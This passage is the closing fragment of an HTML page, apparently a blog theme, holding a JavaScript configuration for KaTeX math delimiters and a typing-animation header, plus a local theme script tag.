rottenbytes"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
